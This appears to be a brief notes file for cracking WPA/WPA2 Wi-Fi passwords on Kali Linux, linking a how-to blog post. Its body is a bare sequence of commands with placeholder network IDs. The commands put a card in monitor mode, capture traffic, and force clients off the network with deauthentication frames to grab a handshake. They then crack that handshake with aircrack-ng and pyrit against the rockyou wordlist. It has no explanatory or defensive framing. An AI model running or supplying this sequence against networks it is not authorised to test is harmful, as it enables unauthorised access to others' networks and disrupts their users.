# wifi-kali

http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html

### CRACKBEGIN
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 1,1 --bssid {bsid1} -w /home/mon0 wlan0mon
aireplay-ng -0 2 -a {bsid1} -c {bsid2} wlan0mon
aircrack-ng -a2 -b {bsid3} -w /root/wpa.txt /root/Desktop/*.cap
airmon-ng stop wlan0mon

pyrit -r BSSID.cap analyze
pyrit -i ./rockyou.txt import_passwords
pyrit -e BSSID create_essid
#pyrit eval
pyrit batch

### CRACKEND
